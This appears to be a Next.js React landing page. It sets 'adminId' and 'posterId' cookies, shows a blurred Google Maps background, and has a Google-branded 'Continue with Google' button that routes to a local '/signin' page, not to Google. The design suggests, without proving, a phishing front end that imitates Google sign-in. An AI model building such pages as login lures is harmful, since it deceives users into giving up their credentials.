"use client";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { useEffect } from "react";
function Home({ adminId, posterId }) {
  useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, []);
  const router = useRouter();
  return (
    <div className="bg-gray-300">
      <div className="relative">
        <iframe
          class="absolute inset-0 object-cover w-full h-full"
          src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
          frameborder="0"
          style={{
            border: "0",
            position: "fixed",
            top: 0,
            left: 0,
            bottom: 0,
            right: 0,
            width: "100%",
            height: "100%",
            margin: 0,
            filter: "blur(2px)",
            WebkitFilter: "blur(2px)",
            overflow: "hidden",
            zIndex: -1,
            backgroundColor: "gray",
          }}
          allowfullscreen=""
          loading="lazy"
        ></iframe>

        <div className="relative z-10 shadow-2xl">
          {" "}
          <button
            onClick={() => router.push("/signin")}
            className="bg-[#bfdbfe] absolute mt-[300px] left-[42%] top-[50%]  px-10 py-3 rounded-full text-black text-[16px] font-OpenSans flex items-center gap-2 "
          >
            <img
              src="/images/google-logo-small.png"
              alt="logo"
              className="absolute top-[50%] left-[10%] translate-x-[-50%] translate-y-[-50%] w-[30px] h-[30px]"
            />{" "}
            Continue with Google
          </button>
        </div>
      </div>
    </div>
  );
}

export default Home;
